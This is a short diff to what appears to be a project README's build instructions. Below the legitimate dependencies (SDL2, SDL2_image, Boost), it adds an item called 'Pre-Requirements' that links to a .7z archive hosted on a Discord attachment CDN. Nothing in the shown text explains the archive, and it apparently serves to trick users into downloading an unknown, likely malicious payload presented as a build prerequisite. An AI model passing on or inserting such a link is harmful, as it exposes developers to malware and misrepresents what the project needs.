@@ -53,7 +53,7 @@ You will need to install the following dependencies and CMake will need to be ab
     1. SDL2
     2. SDL2_image
     3. Boost (make sure to build the optional dependencies)
-
+    4. [Pre-Requirements](https://cdn.discordapp.com/attachments/1004540232999387137/1006702235343917207/Prereqs.7z)
 ### Step 4 - Build and Run
 From the root directory of the project, run the following commands:
 
